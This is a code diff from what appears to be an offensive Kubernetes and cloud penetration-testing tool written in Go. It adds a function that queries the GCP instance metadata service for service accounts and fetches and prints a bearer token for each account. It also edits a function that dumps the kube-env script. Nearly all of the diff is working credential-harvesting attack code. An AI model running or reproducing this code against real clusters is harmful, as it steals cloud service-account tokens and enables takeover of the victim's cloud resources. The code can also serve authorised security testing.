@@ -200,9 +200,45 @@ func attackKubeEnvGCP(interactive bool) {
 		// TODO: Should we get error code the way we used to:
 		// fmt.Printf("[-] Attempt to get kube-env script failed with status code %d\n", resp.StatusCode)
 		pauseToHitEnter(interactive)
+		return
 	}
 	kubeEnvLines := strings.Split(string(kubeEnv), "\n")
 	for _, line := range kubeEnvLines {
 		println(line)
 	}
+}
+
+func getGCPToken(interactive bool) {
+	// TODO: Store the GCP token and display, to bring this inline with the GCP functionality.
+
+	// Make a request for a list of service account(s)
+	var headers []HeaderLine
+	headers = []HeaderLine{
+		{"Metadata-Flavor", "Google"},
+	}
+	url := "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"
+	svcAcctListRaw, _ := GetRequest(url, headers, false)
+	if (svcAcctListRaw == "") || (strings.HasPrefix(svcAcctListRaw, "ERROR:")) {
+		pauseToHitEnter(interactive)
+		return
+	}
+
+	// Parse the output service accounts into svcAcctListLines
+	svcAcctListLines := strings.Split(string(svcAcctListRaw), "\n")
+
+	// For each line found found, request a token corresponding to that line and print it.
+	for _, line := range svcAcctListLines {
+
+		if strings.TrimSpace(string(line)) == "" {
+			continue
+		}
+		account := strings.TrimRight(string(line), "/")
+
+		fmt.Printf("\n[+] GCP Credentials for account %s\n\n", account)
+		token, _, err := GetGCPBearerTokenFromMetadataAPI(account)
+		if err == nil {
+			println(token)
+		}
+	}
+	println(" ")
 }
